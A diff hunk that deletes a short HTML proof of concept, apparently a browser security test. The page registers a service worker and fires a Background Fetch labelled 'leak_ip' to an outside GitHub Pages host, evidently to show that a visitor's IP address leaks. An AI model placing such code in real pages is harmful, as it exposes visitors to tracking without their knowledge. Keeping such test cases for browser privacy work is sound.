@@ -1,7 +1,0 @@
-<!DOCTYPE html>
-<html><script>navigator.serviceWorker.register("/sw.js");
-  navigator.serviceWorker.ready.then((reg) => {
-    reg.backgroundFetch.fetch("leak_ip", [
-      "https://kjozwiak.github.io/poc",
-    ]);
-  });</script></html>
